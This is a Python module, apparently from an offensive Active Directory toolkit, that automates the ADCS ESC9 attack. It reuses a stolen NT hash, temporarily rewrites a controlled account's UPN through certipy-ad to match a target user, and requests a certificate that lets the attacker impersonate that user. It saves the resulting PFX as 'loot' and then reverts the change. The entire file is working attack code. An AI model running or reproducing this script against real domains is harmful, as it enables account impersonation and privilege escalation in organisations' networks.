import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc9(session, template):
    print(blue(f"[>] ESC9: Abusing shadow credentials to impersonate another user via UPN manipulation."))
    print(yellow("[*] This method temporarily modifies a controlled account's UPN to match the target, issues a cert, and then reverts it."))

    controlled_user = input("[?] Enter the user you control (e.g., user2): ").strip()
    target_user = input("[?] Enter the user you want to impersonate (e.g., user3): ").strip()

    hash_file = f"loot/{controlled_user}.hash"
    print(blue(f"[*] Loading NT hash from: {hash_file}"))
    if not os.path.exists(hash_file):
        print(red(f"[-] Hash file not found. Run 'attack shadow {controlled_user}' first."))
        return

    with open(hash_file, "r") as f:
        nt_hash = f.read().strip()

    if not nt_hash or nt_hash.lower() == "none":
        print(red("[-] NT hash value is invalid."))
        return

    print(green(f"[+] Loaded NT hash for {controlled_user}: {nt_hash}"))

    new_upn = f"{target_user}@{session.domain}"
    revert_upn = f"{controlled_user}@{session.domain}"

    print(blue(f"[*] Changing UPN of '{controlled_user}' to '{new_upn}'"))
    update_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {new_upn}"
    )
    out, err = run_command(update_cmd)
    print(out.strip() or err.strip())

    output_file = f"esc9_{target_user}.pfx"
    request_cmd = (
        f"certipy-ad req -u {controlled_user}@{session.domain} -hashes :{nt_hash} "
        f"-ca {session.adcs_metadata['cas'][0]['name']} -template {template} -out {output_file}"
    )
    print(blue(f"[*] Requesting certificate as {new_upn}..."))
    out, err = run_command(request_cmd)
    print(out.strip() or err.strip())

    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"))
    else:
        print(red("[-] Certificate file not found or empty after request."))
        print(yellow("[!] If the PFX file was not created or saved, retry the attack. It could be a connection issue."))

    print(yellow(f"[*] Command executed: {request_cmd}"))

    print(blue(f"[*] Reverting UPN of '{controlled_user}' to '{revert_upn}'"))
    revert_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {revert_upn}"
    )
    out, err = run_command(revert_cmd)
    print(out.strip() or err.strip())
    print(green("[+] Reversion complete. ESC9 attack flow finished."))
